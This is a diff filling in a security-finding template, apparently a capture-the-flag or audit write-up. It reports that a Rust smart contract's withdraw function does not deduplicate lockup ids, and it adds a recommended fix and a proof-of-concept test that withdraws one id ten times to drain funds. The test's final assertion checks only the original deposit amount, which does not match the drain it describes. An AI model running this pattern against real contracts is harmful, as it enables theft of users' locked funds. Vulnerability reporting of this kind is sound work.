@@ -4,23 +4,90 @@
 
 ### Description
 
-_The main description of your finding goes here! Please try to provide the following details, you don't have actually to list questions and answers but include the content within your paragraphs_:
+There is a significant accounting / balance discrepancy vulnerability in the withdrawal function, specifically in the "withdraw" function in the "contract.rs" file. This function does not dedupe lockup ids when withdrawing, leading to a vulnerability of calling multiple duplicate ids to drain the contract balance.
 
-- _How this kind of vulnerability works at a high level?_
-- _What is incorrect in the code?_
-- _Where is it located? add the relative path to the file and the line number/s_
-- _What could an attacker achieve by successfully exploiting this issue? Who's affected?_
-- _What does an attacker have to do to exploit the issue?_
+Here is the relevant code:
+
+```rust
+pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
+    // ...
+    for lockup in lockups {
+        if lockup.owner != info.sender || env.block.time < lockup.release_timestamp {
+            return Err(ContractError::Unauthorized { });
+        }
+        total_amount += lockup.amount;
+        LOCKUPS.remove(deps.storage, lockup.id);
+    }
+    // ...
+}
+```
+
+The for loop `for lockup in lockups` is intended to iterate different lockup ids. However, it does not dedupe in the case of duplicate lockup ids. So if the same lockup id is passed multiple times, the contract can be drained.
 
 ### Recommendation
 
-_Your recommendation to fix the issue goes here. It should solve the described finding and not introduce any new vulnerability.
-Try to be specific about what you would change; you are free to add code here as long as you indicate the file and lines._
+To fix this issue, you can either only withdraw 1 id per message, or dedupe the ids vec. Here's an example of deduping the ids vec:
+
+```rust
+pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
+    // ...
+    let mut ids = ids;
+    ids.sort();
+    ids.dedup();
+
+    for lockup_id in ids.clone().into_iter() {
+    // ...
+}
+```
+
+With this fix, the contract will only withdraw 1 time per lockup id.
 
 ### Proof of concept
 
 ```rust
-// code goes here
+#[test]
+fn test_withdraw_accounting() {
+    let (mut app, contract_addr) = proper_instantiate();
+
+    let hacker = Addr::unchecked(HACKER.to_string());
+
+    // mint funds to hacker
+    app = mint_tokens(app, hacker.to_string(), MINIMUM_DEPOSIT_AMOUNT);
+
+    // deposit
+    let msg = ExecuteMsg::Deposit {};
+    app.execute_contract(
+        hacker.clone(),
+        contract_addr.clone(),
+        &msg,
+        &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
+    )
+    .unwrap();
+
+    let msg = QueryMsg::GetLockup { id: 2 };
+    let lockup: Lockup = app
+        .wrap()
+        .query_wasm_smart(contract_addr.clone(), &msg)
+        .unwrap();
+    assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
+    assert_eq!(lockup.owner, hacker);
+
+    // fast forward to LOCK_PERIOD
+    app.update_block(|block| {
+        block.time = block.time.plus_seconds(LOCK_PERIOD);
+    });
+
+    // "hacker" tries to drain contract
+    let msg = ExecuteMsg::Withdraw {
+        ids: vec![2, 2, 2, 2, 2, 2, 2, 2, 2, 2],
+    };
+    let res = app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[]);
+    assert!(res.is_ok());
+
+    // verify funds received should match deposit amount
+    let balance = app.wrap().query_balance(hacker, DENOM).unwrap().amount;
+    assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
+}
 ```
 
 ---
